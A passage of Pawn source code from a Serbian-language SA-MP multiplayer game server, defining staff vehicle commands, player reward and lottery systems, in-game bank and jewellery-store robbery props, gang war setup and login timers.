    SendInfoMessage(id, "Administrator %s ti je vratio stats!", ImeIgraca(playerid));

    new string[ 128 ]; 
    format( string, sizeof( string ), "Admin %s je vratio stats igracu %s", ImeIgraca( playerid ), ImeIgraca( id ));
    LogSave( "Ostalo/LogPocetniStats.log", string );

    return 1;
}

CMD:aveh( playerid, params[] ) {
    if( ServerInfo[ BrojKreiranihVozila ] > MaxBrojKreiranih ) return SCM( playerid, SVETLOCRVENA, "| V:AC | Nemoguce je trenutno kreirati vozilo, limit vozila na serveru je dosegnut.");
    if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

    if( AdminVozilo[ playerid ] == -1 ) {
       
        ShowPlayerDialog(playerid, dialog_AVeh, DIALOG_STYLE_LIST, "Odaberite Admin Vozilo", "Infernus\nNrg-500\nSultan\nHuntley\nCheetah\nTurismo\nFBI Rancher\nSandKing", "Potvrdi", "Odustani");

    }
    else if( AdminVozilo[ playerid ] != -1 ) {
        SendInfoMessage( playerid, "Vozilo ID: %d je unisteno.", AdminVozilo[ playerid ] );
        Novi_DestroyVehicle( AdminVozilo[ playerid ] );
        // DestroyDynamic3DTextLabel(AdminVehLabel[playerid]);
        AdminVozilo[ playerid ] = -1;
    }
    return true;
}

CMD:listenf(playerid) {

    if(PlayerInfo[playerid][xAdmin] < 1) return SendErrorMessage(playerid, "Nisi ovlascen!");

    if(listenFamily[playerid]) {

        listenFamily[playerid] = false;
        SendInfoMessage(playerid, "Iskljucio si slusanje /f chat-a!");
        return 1;
    }
    else {

        listenFamily[playerid] = true;
        SendInfoMessage(playerid, "Ukljucio si slusanje /f chat-a!");
        return 1;
    }
}

CMD:h1(playerid, params[]) {

    if(PlayerInfo[playerid][xSupporter] < 1) return SendErrorMessage(playerid, "Ti nisi helper!");

    new id;
    if(sscanf(params, "u", id)) return SendUsageMessage(playerid, "/h1 [ID]");
    if(!IsPlayerConnected(id)) return SendErrorMessage(playerid, "Pogresan ID!");
    if(helperUsed[id]) return SendErrorMessage(playerid, "Drugi Helper/Admin je vec koristio ovu komandu za tog igraca.");

    SendClientMessageEx(id, ZELENA, "{8EFF00}Helper kaze: "col_white"Dobrodosao na Valhallu! Zelimo ti dobru zabavu i prijatan boravak.");
    helperUsed[id] = true;
    defer resetHelperUsed(id);

    return 1;
}

CMD:h2(playerid, params[]) {

    if(PlayerInfo[playerid][xSupporter] < 1) return SendErrorMessage(playerid, "Ti nisi helper!");

    new id;
    if(sscanf(params, "u", id)) return SendUsageMessage(playerid, "/h2 [ID]");
    if(!IsPlayerConnected(id)) return SendErrorMessage(playerid, "Pogresan ID!");
    if(helperUsed[id]) return SendErrorMessage(playerid, "Drugi Helper/Admin je vec koristio ovu komandu za tog igraca.");

    SendClientMessageEx(id, ZELENA, "{8EFF00}Helper kaze: "col_white"Ukoliko ti je potrebna pomoc, mozes nam se javiti preko komande /askq ili /new.");
    helperUsed[id] = true;
    defer resetHelperUsed(id);

    return 1;
}

timer resetHelperUsed[15000](playerid) {

    helperUsed[playerid] = false;

    return 1;
}

ptask resetovanjeAktivneIgre[1000](playerid) {

    new hour, minute, second;
    gettimeEx( hour, minute, second );
    FixHour( hour );
    hour = shifthour;

    if(hour == 23 && minute == 0 && second == 0) { 

        AktivnaIgra[playerid] = 0;
        SendInfoMessage(playerid, "Aktivna igra resetovana! /aktivnaigra");
    }
    return 1;
}

CMD:aktivnaigra(playerid) {

    new DialogStrgEx1[ 3000 ];

    strcat( DialogStrgEx1, ""SRVBOJA1SCM"__________________________"col_white" Aktivna Igra "SRVBOJA1SCM"__________________________\n\n");
    strcat( DialogStrgEx1, ""SRVBOJA1SCM"Aktivna Igra je sistem koji nagradjuje igrace za svoju aktivnost na serveru!\n");
    strcat( DialogStrgEx1, ""SRVBOJA1SCM"Na svaku platu dobijate jedan poen! Poeni se resetuju svako vece u 23:00!\n\n");

    new string[64];
    format(string, sizeof(string), ""SRVBOJA1SCM"Trenutni broj poena : "col_white"%d!\n\n", AktivnaIgra[playerid]);
    strcat( DialogStrgEx1, string);

    strcat( DialogStrgEx1, ""SRVBOJA1SCM"NAGRADA 5 POENA  | "col_white" 8.000$\n");
    strcat( DialogStrgEx1, ""SRVBOJA1SCM"NAGRADA 10 POENA | "col_white" 15.000$\n");
    strcat( DialogStrgEx1, ""SRVBOJA1SCM"NAGRADA 20 POENA | "col_white" 20.000$ + LevelUP\n");

    SPD(playerid, 0, DSMSG, ""SRVBOJA1SCM"Aktivna Igra", DialogStrgEx1, "Potvrdi", "");
}

task tombolaVrtenjeTimer[600000]() {

    if(ServerInfo[SrecniID] == 1) {

        if(Iter_Count(Player) < 10) return 0;

        new id = INVALID_PLAYER_ID;

        for( ; ; ) {

            id = Iter_Random(Player);
            if(PlayerLogged[id] && IsPlayerConnected(id)) break;
        }

        giveSrecniIDPrice(id);

        return 1;
    }

    return 1;
}

giveSrecniIDPrice(playerid) {

    new tombolaPrice[38];
    new randomPrice = RandomNew(1, 5);

    switch(randomPrice) {

        case 1: {

            tombolaPrice = "+5.000$";
            DajIgracuNovac(playerid, 5000);
            SavePlayer(playerid);
        }
        case 2: {

            tombolaPrice = "+2 Respekt";
            PlayerInfo[playerid][xRespekt] += 2;
            SavePlayer(playerid);
            respectCheck(playerid);
        }
        case 3: {

            tombolaPrice = "+4 Respekt";
            PlayerInfo[playerid][xRespekt] += 4;
            SavePlayer(playerid);
            respectCheck(playerid);
        }
        case 4: {

            tombolaPrice = "+15.000$";
            DajIgracuNovac(playerid, 15000);
            SavePlayer(playerid);
        }
    }

    va_SendClientMessageToAll(SRVBOJA1, "{B2A8C7}SRECNI ID | Igrac {FFFF00}%s[%i] {B2A8C7}je osvojio nagradu: {FFFF00}%s", ImeIgraca(playerid), playerid, tombolaPrice);

    return 1;
}

timer BusilicaTimer[1000](playerid) {

    if(BusilicaTime[playerid] != 0) {

        BankaBusilicaTDSakrij(playerid);
        new string[16];
        format(string, sizeof(string), "%d_sekundi", BusilicaTime[playerid]);
        PlayerTextDrawSetString(playerid, BankaBusilicaTD[playerid][3], string);
        BankaBusilicaTDPrikazi(playerid);
        BusilicaTime[playerid]--;
        TimerRobBanka = defer BusilicaTimer(playerid);
        return 1;

    } else {

        BankaBusilicaTDSakrij(playerid);
        UnistiBusilicu();
        PomeriBankaVrata();
        PokupiTorbu[playerid] = true;
        SendInfoMessage(playerid, "Pokupi novac sa stola pritiskom na N");
        return 1;
    }
}

KreirajNovac() {

    NovacBanka[0] = CreateDynamicObjectEx(1550, 1002.428161, 1891.922241, 1202.129760, 0.000000, 0.000000, 0.000000, 300.00, 300.00); 
    NovacBanka[1] = CreateDynamicObjectEx(1550, 1002.834472, 1891.922241, 1202.109741, 0.000000, 0.000000, 0.000000, 300.00, 300.00); 
    NovacBanka[2] = CreateDynamicObjectEx(1550, 1003.080627, 1891.922241, 1201.569213, 0.000000, 0.000000, 0.000000, 300.00, 300.00); 
    NovacBanka[3] = CreateDynamicObjectEx(1550, 1002.790832, 1891.922241, 1201.569213, 0.000000, 0.000000, 0.000000, 300.00, 300.00); 
    NovacBanka[4] = CreateDynamicObjectEx(1550, 1002.469482, 1891.922241, 1201.569213, 0.000000, 0.000000, 0.000000, 300.00, 300.00); 
    NovacBanka[5] = CreateDynamicObjectEx(1550, 1002.127014, 1891.922241, 1201.569213, 0.000000, 0.000000, 0.000000, 300.00, 300.00); 
    NovacBanka[6] = CreateDynamicObjectEx(1550, 1001.759765, 1891.922241, 1201.569213, 0.000000, 0.000000, 0.000000, 300.00, 300.00); 
    NovacBanka[7] = CreateDynamicObjectEx(1550, 1001.424255, 1891.922241, 1201.569213, 0.000000, 0.000000, 0.000000, 300.00, 300.00); 
    NovacBanka[8] = CreateDynamicObjectEx(1550, 1002.038269, 1891.922241, 1202.149780, 0.000000, 0.000000, 0.000000, 300.00, 300.00); 
    NovacBanka[9] = CreateDynamicObjectEx(1550, 1001.657226, 1891.922241, 1202.169799, 0.000000, 0.000000, 0.000000, 300.00, 300.00); 
}

UnistiNovac() {

    for(new i = 0; i < 10; i++) {

        DestroyDynamicObject(NovacBanka[i]);
    }
}

KreirajBusilicu() {

    Busilica[0] = CreateDynamicObjectEx(18655, 1006.896484, 1881.028686, 1202.146240, 0.000000, 99.000000, 0.000000, 300.00, 300.00); 
    SetDynamicObjectMaterial(NovacBanka[0], 0, 18871, "mobilephone7", "mobilephone7-1", 0x00000000);
    Busilica[1] = CreateDynamicObjectEx(18868, 1010.123779, 1881.005493, 1201.736816, 63.000000, 0.000000, 90.000000, 300.00, 300.00); 
    SetDynamicObjectMaterial(NovacBanka[1], 2, 18871, "mobilephone7", "mobilephone7-2", 0x00000000);
    SetDynamicObjectMaterial(NovacBanka[1], 3, 18871, "mobilephone7", "mobilephone7-2", 0x00000000);
    SetDynamicObjectMaterial(NovacBanka[1], 4, 18871, "mobilephone7", "mobilephone7-2", 0x00000000);
    Busilica[2] = CreateDynamicObjectEx(19610, 1009.616149, 1881.047241, 1201.567260, 0.000000, 0.000000, -90.000000, 300.00, 300.00);
}

UnistiBusilicu() {

    for(new i = 0; i < 3; i++) {

        DestroyDynamicObject(Busilica[i]);
    }
}

KreirajSefBanka() {

    BankaSef[0] = CreateDynamicObjectEx(19325, 1006.975036, 1880.399414, 1204.456054, 0.000000, 0.000000, 0.000000, 300.00, 300.00);
    BankaSef[1] = CreateDynamicObjectEx(19411, 1006.904296, 1881.346923, 1203.930053, 0.000000, 0.000000, 0.000000, 300.00, 300.00); 
    SetDynamicObjectMaterial(NovacBanka[1], 0, 18646, "matcolours", "grey-10-percent", 0x00000000);
    BankaSef[2] = CreateDynamicObjectEx(19377, 1006.904296, 1874.992797, 1199.220336, 0.000000, 0.000000, 0.000000, 300.00, 300.00); 
    SetDynamicObjectMaterial(NovacBanka[2], 0, 18646, "matcolours", "grey-10-percent", 0x00000000);
    BankaSef[3] = CreateDynamicObjectEx(19377, 1006.904296, 1887.713256, 1199.220336, 0.000000, 0.000000, 0.000000, 300.00, 300.00); 
    SetDynamicObjectMaterial(NovacBanka[3], 0, 18646, "matcolours", "grey-10-percent", 0x00000000);
    BankaSef[4] = CreateDynamicObjectEx(19377, 1006.904296, 1878.102661, 1196.943237, 0.000000, 0.000000, 0.000000, 300.00, 300.00); 
    SetDynamicObjectMaterial(NovacBanka[4], 0, 18646, "matcolours", "grey-10-percent", 0x00000000);
}

UnistiSefBanka() {

    for(new i = 0; i < 5; i++) {

        DestroyDynamicObject(BankaSef[i]);
    }
}

PomeriBankaVrata() {

    UnistiSefBanka();
}

timer SledeciRobBanke[21600000]() {

    UnistiSefBanka();

    BankaOrobana = false;
    BankaUToku = false;

    KreirajSefBanka();

    UnistiNovac();
    KreirajNovac();

    return 1;
}

BankaBusilicaTDPrikazi(playerid) {

    for(new td = 0; td < 4; td++) {

        PlayerTextDrawShow(playerid, BankaBusilicaTD[playerid][td]);
    }
} 

BankaBusilicaTDSakrij(playerid) {

    for(new td = 0; td < 4; td++) {

        PlayerTextDrawHide(playerid, BankaBusilicaTD[playerid][td]);
    }
}

BankaBusilicaTDKreiraj(playerid) {

    BankaBusilicaTD[playerid][0] = CreatePlayerTextDraw(playerid, 35.300014, 265.308319, "box");
    PlayerTextDrawLetterSize(playerid, BankaBusilicaTD[playerid][0], 0.000000, 2.500000);
    PlayerTextDrawTextSize(playerid, BankaBusilicaTD[playerid][0], 107.799682, 0.000000);
    PlayerTextDrawAlignment(playerid, BankaBusilicaTD[playerid][0], 1);
    PlayerTextDrawColor(playerid, BankaBusilicaTD[playerid][0], -1);
    PlayerTextDrawUseBox(playerid, BankaBusilicaTD[playerid][0], 1);
    PlayerTextDrawBoxColor(playerid, BankaBusilicaTD[playerid][0], 303174399);
    PlayerTextDrawSetShadow(playerid, BankaBusilicaTD[playerid][0], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaBusilicaTD[playerid][0], 255);
    PlayerTextDrawFont(playerid, BankaBusilicaTD[playerid][0], 1);
    PlayerTextDrawSetProportional(playerid, BankaBusilicaTD[playerid][0], 1);

    BankaBusilicaTD[playerid][1] = CreatePlayerTextDraw(playerid, 35.399978, 265.130462, "box");
    PlayerTextDrawLetterSize(playerid, BankaBusilicaTD[playerid][1], 0.000000, 0.699998);
    PlayerTextDrawTextSize(playerid, BankaBusilicaTD[playerid][1], 107.769523, 0.000000);
    PlayerTextDrawAlignment(playerid, BankaBusilicaTD[playerid][1], 1);
    PlayerTextDrawColor(playerid, BankaBusilicaTD[playerid][1], -1);
    PlayerTextDrawUseBox(playerid, BankaBusilicaTD[playerid][1], 1);
    PlayerTextDrawBoxColor(playerid, BankaBusilicaTD[playerid][1], 310866175);
    PlayerTextDrawSetShadow(playerid, BankaBusilicaTD[playerid][1], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaBusilicaTD[playerid][1], 255);
    PlayerTextDrawFont(playerid, BankaBusilicaTD[playerid][1], 1);
    PlayerTextDrawSetProportional(playerid, BankaBusilicaTD[playerid][1], 1);

    BankaBusilicaTD[playerid][2] = CreatePlayerTextDraw(playerid, 71.349411, 264.197875, "BANKA_ROB");
    PlayerTextDrawLetterSize(playerid, BankaBusilicaTD[playerid][2], 0.162498, 0.806666);
    PlayerTextDrawAlignment(playerid, BankaBusilicaTD[playerid][2], 2);
    PlayerTextDrawColor(playerid, BankaBusilicaTD[playerid][2], 255);
    PlayerTextDrawSetShadow(playerid, BankaBusilicaTD[playerid][2], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaBusilicaTD[playerid][2], 255);
    PlayerTextDrawFont(playerid, BankaBusilicaTD[playerid][2], 2);
    PlayerTextDrawSetProportional(playerid, BankaBusilicaTD[playerid][2], 1);

    BankaBusilicaTD[playerid][3] = CreatePlayerTextDraw(playerid, 71.699676, 275.164611, "999_sekundi");
    PlayerTextDrawLetterSize(playerid, BankaBusilicaTD[playerid][3], 0.317499, 1.139554);
    PlayerTextDrawAlignment(playerid, BankaBusilicaTD[playerid][3], 2);
    PlayerTextDrawColor(playerid, BankaBusilicaTD[playerid][3], 310866175);
    PlayerTextDrawSetShadow(playerid, BankaBusilicaTD[playerid][3], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaBusilicaTD[playerid][3], 255);
    PlayerTextDrawFont(playerid, BankaBusilicaTD[playerid][3], 3);
    PlayerTextDrawSetProportional(playerid, BankaBusilicaTD[playerid][3], 1);
}

timer KreirajBankaPickup[4000](Float:IgracPosX, Float:IgracPosY, Float:IgracPosZ) {

    TorbaBankaPickup = CreateDynamicPickup(1550, 1, IgracPosX, IgracPosY, IgracPosZ, -1, -1, -1, STREAMER_PICKUP_SD, -1, 0);
    return 1;
}

CMD:resetrobbanke(playerid) {

    if(PlayerInfo[playerid][xAdmin] < 3) return SendErrorMessage(playerid, "Nisi ovlascen!");

    UnistiSefBanka();

    BankaOrobana = false;
    BankaUToku = false;

    KreirajSefBanka();

    UnistiNovac();
    KreirajNovac();

    SendInfoMessage(playerid, "Uspesno si resetovao rob banke!");
    return 1;
}

CMD:resetrobzlatare(playerid) {

    if(PlayerInfo[playerid][xAdmin] < 3) return SendErrorMessage(playerid, "Nisi ovlascen!");

    DestroyDynamicObject(ZlataraSef);
    DestroyDynamicObject(ZlataraSef2);
    DestroyDynamicObject(ZidZlatara);

    ZlataraOrobana = false;
    ZlataraZidProbijen = false;

    ZlataraSef = CreateDynamicObject(19462,1108.269,-1675.543,11.984,-90.000,0.000,0.000,-1,-1,-1,50.000,50.000);
    SetDynamicObjectMaterial(ZlataraSef, 0, 9525, "boigas_sfw", "GEwhite1_64", 0x00000000);

    ZlataraSef2 = CreateDynamicObject(18886,1107.312,-1675.508,14.565,-90.000,-90.000,0.000,-1,-1,-1,50.000,50.000);
    SetDynamicObjectMaterial(ZlataraSef2, 0, 10101, "2notherbuildsfe", "ferry_build14", 0x00000000);
    SetDynamicObjectMaterial(ZlataraSef2, 1, 18996, "mattextures", "sampblack", 0x00000000);

    ZidZlatara = CreateDynamicObject(19462,1118.961,-1677.724,10.354,-90.000,0.000,0.000,-1,-1,-1,50.000,50.000);
    SetDynamicObjectMaterial(ZidZlatara, 0, 10765, "airportgnd_sfse", "white", 0x00000000);

    ZlataraCuvarUpucan = false;

    SendInfoMessage(playerid, "Uspesno si resetovao rob zlatare!");
    return 1;
}

CMD:resetrobrolex(playerid) {

    if(PlayerInfo[playerid][xAdmin] < 3) return SendErrorMessage(playerid, "Nisi ovlascen!");

    ResetujRolexRob();

    SendInfoMessage(playerid, "Uspesno si resetovao rob Rolex Store-a!");
    return 1;
}

timer startWar[60000](w) {

    GetPlayerPos( WARInfo[ w ][ warTeamLeader ][ 0 ], WARPInfo[ WARInfo[ w ][ warTeamLeader ][ 0 ] ][ LastPosition ][ 0 ], WARPInfo[ WARInfo[ w ][ warTeamLeader ][ 0 ] ][ LastPosition ][ 1 ],  WARPInfo[ WARInfo[ w ][ warTeamLeader ][ 0 ] ][ LastPosition ][ 2 ] );
    WARPInfo[ WARInfo[ w ][ warTeamLeader ][ 0 ] ][ LastVirtualWorld ] = GetPlayerVirtualWorld( WARInfo[ w ][ warTeamLeader ][ 0 ] );
    WARPInfo[ WARInfo[ w ][ warTeamLeader ][ 0 ] ][ LastInterior ] = GetPlayerInterior( WARInfo[ w ][ warTeamLeader ][ 0 ] );

    GetPlayerPos( WARInfo[ w ][ warTeamLeader ][ 1 ], WARPInfo[ WARInfo[ w ][ warTeamLeader ][ 1 ] ][ LastPosition ][ 0 ], WARPInfo[ WARInfo[ w ][ warTeamLeader ][ 1 ] ][ LastPosition ][ 1 ],  WARPInfo[ WARInfo[ w ][ warTeamLeader ][ 1 ] ][ LastPosition ][ 2 ] );
    WARPInfo[ WARInfo[ w ][ warTeamLeader ][ 1 ] ][ LastVirtualWorld ] = GetPlayerVirtualWorld( WARInfo[ w ][ warTeamLeader ][ 0 ] );
    WARPInfo[ WARInfo[ w ][ warTeamLeader ][ 1 ] ][ LastInterior ] = GetPlayerInterior( WARInfo[ w ][ warTeamLeader ][ 1 ] );

    if( WARInfo[ w ][ warMap ] == 1 ) {
        new rand1 = random( sizeof( warMap1Team1 ) );
        new rand2 = random( sizeof( warMap1Team2 ) );
        SetPlayerPos( WARInfo[ w ][ warTeamLeader ][ 0 ], warMap1Team1[ rand1 ][ 0 ], warMap1Team1[ rand1 ][ 1 ],warMap1Team1[ rand1 ][ 2 ] );
        SetPlayerPos( WARInfo[ w ][ warTeamLeader ][ 1 ], warMap1Team2[ rand2 ][ 0 ], warMap1Team2[ rand2 ][ 1 ],warMap1Team2[ rand2 ][ 2 ] );
        SetPlayerInterior( WARInfo[ w ][ warTeamLeader ][ 0 ], 0 );
        SetPlayerInterior( WARInfo[ w ][ warTeamLeader ][ 1 ], 0 );
    }
    else if( WARInfo[ w ][ warMap ] == 2 ) {
        new rand1 = random( sizeof( warMap2Team1 ) );
        new rand2 = random( sizeof( warMap2Team2 ) );
        SetPlayerPos( WARInfo[ w ][ warTeamLeader ][ 0 ], warMap2Team1[ rand1 ][ 0 ], warMap2Team1[ rand1 ][ 1 ],warMap2Team1[ rand1 ][ 2 ] );
        SetPlayerPos( WARInfo[ w ][ warTeamLeader ][ 1 ], warMap2Team2[ rand2 ][ 0 ], warMap2Team2[ rand2 ][ 1 ],warMap2Team2[ rand2 ][ 2 ] );
        SetPlayerInterior( WARInfo[ w ][ warTeamLeader ][ 0 ], 10 );
        SetPlayerInterior( WARInfo[ w ][ warTeamLeader ][ 1 ], 10 );
    }
    else if( WARInfo[ w ][ warMap ] == 3 ) {
        new rand1 = random( sizeof( warMap3Team1 ) );
        new rand2 = random( sizeof( warMap3Team2 ) );
        SetPlayerPos( WARInfo[ w ][ warTeamLeader ][ 0 ], warMap3Team1[ rand1 ][ 0 ], warMap3Team1[ rand1 ][ 1 ],warMap3Team1[ rand1 ][ 2 ] );
        SetPlayerPos( WARInfo[ w ][ warTeamLeader ][ 1 ], warMap3Team2[ rand2 ][ 0 ], warMap3Team2[ rand2 ][ 1 ],warMap3Team2[ rand2 ][ 2 ] );
        SetPlayerInterior( WARInfo[ w ][ warTeamLeader ][ 0 ], 0 );
        SetPlayerInterior( WARInfo[ w ][ warTeamLeader ][ 1 ], 0 );
    }
    else if( WARInfo[ w ][ warMap ] == 4 ) {
        new rand1 = random( sizeof( warMap4Team1 ) );
        new rand2 = random( sizeof( warMap4Team2 ) );
        SetPlayerPos( WARInfo[ w ][ warTeamLeader ][ 0 ], warMap4Team1[ rand1 ][ 0 ], warMap4Team1[ rand1 ][ 1 ],warMap4Team1[ rand1 ][ 2 ] );
        SetPlayerPos( WARInfo[ w ][ warTeamLeader ][ 1 ], warMap4Team2[ rand2 ][ 0 ], warMap4Team2[ rand2 ][ 1 ],warMap4Team2[ rand2 ][ 2 ] );
        SetPlayerInterior( WARInfo[ w ][ warTeamLeader ][ 0 ], 0 );
        SetPlayerInterior( WARInfo[ w ][ warTeamLeader ][ 1 ], 0 );
    }
    else if( WARInfo[ w ][ warMap ] == 5 ) {
        new rand1 = random( sizeof( warMap5Team1 ) );
        new rand2 = random( sizeof( warMap5Team2 ) );
        SetPlayerPos( WARInfo[ w ][ warTeamLeader ][ 0 ], warMap5Team1[ rand1 ][ 0 ], warMap5Team1[ rand1 ][ 1 ],warMap5Team1[ rand1 ][ 2 ] );
        SetPlayerPos( WARInfo[ w ][ warTeamLeader ][ 1 ], warMap5Team2[ rand2 ][ 0 ], warMap5Team2[ rand2 ][ 1 ],warMap5Team2[ rand2 ][ 2 ] );
        SetPlayerInterior( WARInfo[ w ][ warTeamLeader ][ 0 ], 0 );
        SetPlayerInterior( WARInfo[ w ][ warTeamLeader ][ 1 ], 0 );
    }

    else if( WARInfo[ w ][ warMap ] == 6 ) {
        new rand1 = random( sizeof( warMap6Team1 ) );
        new rand2 = random( sizeof( warMap6Team2 ) );
        SetPlayerPos( WARInfo[ w ][ warTeamLeader ][ 0 ], warMap6Team1[ rand1 ][ 0 ], warMap6Team1[ rand1 ][ 1 ],warMap6Team1[ rand1 ][ 2 ] );
        SetPlayerPos( WARInfo[ w ][ warTeamLeader ][ 1 ], warMap6Team2[ rand2 ][ 0 ], warMap6Team2[ rand2 ][ 1 ],warMap6Team2[ rand2 ][ 2 ] );
        SetPlayerInterior( WARInfo[ w ][ warTeamLeader ][ 0 ], 0 );
        SetPlayerInterior( WARInfo[ w ][ warTeamLeader ][ 1 ], 0 );
    }


    WARInfo[ w ][ warActive ] = true;

    GiveWeaponToPlayer( WARInfo[ w ][ warTeamLeader ][ 0 ], WARInfo[ w ][ warGuns ][ 0 ], 300 );
    GiveWeaponToPlayer( WARInfo[ w ][ warTeamLeader ][ 0 ], WARInfo[ w ][ warGuns ][ 1 ], 300 );
    GiveWeaponToPlayer( WARInfo[ w ][ warTeamLeader ][ 0 ], WARInfo[ w ][ warGuns ][ 2 ], 300 );
    GiveWeaponToPlayer( WARInfo[ w ][ warTeamLeader ][ 0 ], WARInfo[ w ][ warGuns ][ 3 ], 300 );
    SetPlayerVirtualWorld( WARInfo[ w ][ warTeamLeader ][ 0 ], w );
    SetPlayerHealth( WARInfo[ w ][ warTeamLeader ][ 0 ], 100 );

    GiveWeaponToPlayer( WARInfo[ w ][ warTeamLeader ][ 1 ], WARInfo[ w ][ warGuns ][ 0 ], 300 );
    GiveWeaponToPlayer( WARInfo[ w ][ warTeamLeader ][ 1 ], WARInfo[ w ][ warGuns ][ 1 ], 300 );
    GiveWeaponToPlayer( WARInfo[ w ][ warTeamLeader ][ 1 ], WARInfo[ w ][ warGuns ][ 2 ], 300 );
    GiveWeaponToPlayer( WARInfo[ w ][ warTeamLeader ][ 1 ], WARInfo[ w ][ warGuns ][ 3 ], 300 );
    SetPlayerVirtualWorld( WARInfo[ w ][ warTeamLeader ][ 1 ], w );
    SetPlayerHealth( WARInfo[ w ][ warTeamLeader ][ 1 ], 100 );

    WARInfo[ w ][ warTeamMembers ][ 0 ]++;
    WARInfo[ w ][ warTeamMembers ][ 1 ]++;

    WARInfo[ w ][ warTimer ] = SetTimerEx( "StopWAR", 10*60000, false, "d", w );
    WARInfo[ w ][ warTimerMin ] = 1; WARInfo[ w ][ warTimerSec ] =0;
    WARInfo[ w ][ warTimerTime ] = SetTimerEx( "StopWARTimer", 1000, true, "d", w );

    ResetWarStatistics( WARInfo[ w ][ warTeamLeader ][ 0 ] );
    WARPInfo[ WARInfo[ w ][ warTeamLeader ][ 0 ] ][ warTeam ][ 0 ] = true;
    WARPInfo[ WARInfo[ w ][ warTeamLeader ][ 0 ] ][ warID ] = w;

    ResetWarStatistics( WARInfo[ w ][ warTeamLeader ][ 1 ] );
    WARPInfo[ WARInfo[ w ][ warTeamLeader ][ 1 ] ][ warTeam ][ 1 ] = true;
    WARPInfo[ WARInfo[ w ][ warTeamLeader ][ 1 ] ][ warID ] = w;

    format( globalstring, sizeof( globalstring ), ""COL_ORANGE"WAR "COL_WHITE"| "COL_ORANGE"Team 1: "COL_WHITE"%s "COL_WHITE"| "COL_ORANGE"Team 2: "COL_WHITE"%s", getOrgName( GetPlayerMember( WARInfo[ w ][ warTeamLeader ][ 0 ] ) ), getOrgName( GetPlayerMember( WARInfo[ w ][ warTeamLeader ][ 1 ] ) ) );
    SCM( WARInfo[ w ][ warTeamLeader ][ 0 ], -1, globalstring );
    SCM( WARInfo[ w ][ warTeamLeader ][ 0 ], -1, "War chat /wp." );

    format( globalstring, sizeof( globalstring ), ""COL_ORANGE"WAR "COL_WHITE"| "COL_ORANGE"Team 1: "COL_WHITE"%s "COL_WHITE"| "COL_ORANGE"Team 2: "COL_WHITE"%s", getOrgName( GetPlayerMember( WARInfo[ w ][ warTeamLeader ][ 0 ] ) ), getOrgName( GetPlayerMember( WARInfo[ w ][ warTeamLeader ][ 1 ] ) ) );
    SCM( WARInfo[ w ][ warTeamLeader ][ 1 ], -1, globalstring );
    SCM( WARInfo[ w ][ warTeamLeader ][ 1 ], -1, "War chat /wp." );

    WarTDControl( WARInfo[ w ][ warTeamLeader ][ 0 ], true );
    WarTDControl( WARInfo[ w ][ warTeamLeader ][ 1 ], true );
    SetWarStatsTD( w );

    return 1;
}

CMD:mehanicar(playerid) {

    if(IsPlayerInRangeOfPoint(playerid, 2.0, 1892.1112,-1086.4977,24.5365) ||
        IsPlayerInRangeOfPoint(playerid, 2.0, 1373.4554,-1505.6053,13.7364) ||
        IsPlayerInRangeOfPoint(playerid, 2.0, 1224.1948,-989.4682,43.6764) ||
        IsPlayerInRangeOfPoint(playerid, 2.0, 309.8067,-1372.5594,14.4564) ||
        IsPlayerInRangeOfPoint(playerid, 2.0, 605.1835,-1516.8864,15.1464)) {

        SPD(playerid, dialog_Mehanicar, DIALOG_STYLE_LIST, "Mehanicar", "Popravi Vozilo ( $1000 )\nKupi Repair Kit ( $1500 )", "Kupi", "Odustani");
    }
    else return SendErrorMessage( playerid, "Nisi kod mehanicara!");

    return 1;
}

timer cBugTimer[3000](playerid) {

    TogglePlayerControllable( playerid, 1 );

    return 1;
}

timer loginTimer[60000](playerid) {

    if(!PlayerLogged[playerid]) {

        SendClientMessage( playerid, SVETLOCRVENA, "| V:AC | Niste se ulogovali na vreme! Izbaceni ste!" );
        Novi_Kick( playerid );
        return 1;
    }

    return 1;
}

timer registerTimer[180000](playerid) {

    if(!PlayerLogged[playerid]) {

        SendClientMessage( playerid, SVETLOCRVENA, "| V:AC | Niste se registrovali na vreme! Izbaceni ste!" );
        Novi_Kick( playerid );
        return 1;
    }

    return 1;
}

timer zaposljavanjeTimer[6000](playerid) {

    zaposljavanjeDelay[playerid] = false;

    return 1;
}

CMD:vpveh( playerid, params[] ) {
    if( ServerInfo[ BrojKreiranihVozila ] > MaxBrojKreiranih ) return SCM( playerid, SVETLOCRVENA, "| V:AC | Nemoguce je trenutno kreirati vozilo, limit vozila na serveru je dosegnut.");
    if( PlayerInfo[ playerid ][ xVIPLevel ] < 1 && PlayerInfo[playerid][xPromoter] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if(!IsPlayerInRangeOfPoint(playerid, 2.0, 1078.5199,1287.8156,10.8199)) return SendErrorMessage(playerid, "Nisi na mestu u VIP/Promoter bazi!");

    if( VPVeh[ playerid ] == -1 ) {
       
        ShowPlayerDialog(playerid, dialog_VPVeh, DIALOG_STYLE_LIST, "Odaberite Vip/Promoter Vozilo", "Infernus\nNrg-500\nSultan\nHuntley\nCheetah\nTurismo\nFBI Rancher\nSandKing", "Potvrdi", "Odustani");

    }
    else if( VPVeh[ playerid ] != -1 ) {
        SendInfoMessage( playerid, "Vozilo ID: %d je unisteno.", VPVeh[ playerid ] );
        Novi_DestroyVehicle( VPVeh[ playerid ] );
        // DestroyDynamic3DTextLabel(VPLabel[playerid]);
        VPVeh[ playerid ] = -1;
    }
    return true;
}

CMD:hveh( playerid, params[] ) {
    if( ServerInfo[ BrojKreiranihVozila ] > MaxBrojKreiranih ) return SCM( playerid, SVETLOCRVENA, "| V:AC | Nemoguce je trenutno kreirati vozilo, limit vozila na serveru je dosegnut.");
    if( PlayerInfo[ playerid ][ xSupporter ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

    if( helperVeh[ playerid ] == -1 ) {
       
        ShowPlayerDialog(playerid, dialog_HVeh, DIALOG_STYLE_LIST, "Odaberite Helper Vozilo", "Infernus\nNrg-500\nSultan\nHuntley\nCheetah\nTurismo\nFBI Rancher\nSandKing", "Potvrdi", "Odustani");

    }
    else if( helperVeh[ playerid ] != -1 ) {
        SendInfoMessage( playerid, "Vozilo ID: %d je unisteno.", helperVeh[ playerid ] );
        Novi_DestroyVehicle( helperVeh[ playerid ] );
